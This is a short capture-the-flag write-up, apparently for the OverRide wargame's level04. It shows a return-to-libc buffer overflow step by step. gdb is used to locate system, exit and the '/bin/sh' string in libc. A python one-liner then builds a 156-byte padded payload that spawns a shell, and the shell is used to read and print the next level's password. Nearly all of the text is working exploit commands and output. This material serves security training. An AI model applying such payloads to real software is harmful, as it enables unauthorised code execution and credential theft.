# Return2libc Attack

```bash
(gdb) b main
Breakpoint 1 at 0x80486cd
```

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

addr function system call from lib C

```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```

addr function exit call from lib C

```
(gdb) info proc map
process 3419
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

addr of lib C is between 0xf7e2c000 and 0xf7fd0000
Let's search the /bin/sh string

```
(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

addr of string "/bin/sh" is 0xf7f897ec

```
level04@OverRide:~$ python -c "print 156 * 'A' + '\xf7\xe6\xae\xd0'[::-1] + '\xf7\xe5\xeb\x70'[::-1] + '\xf7\xf8\x97\xec'[::-1]" > /tmp/level4
level04@OverRide:~$ cat /tmp/level4 - | ./level04 
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
^C
```
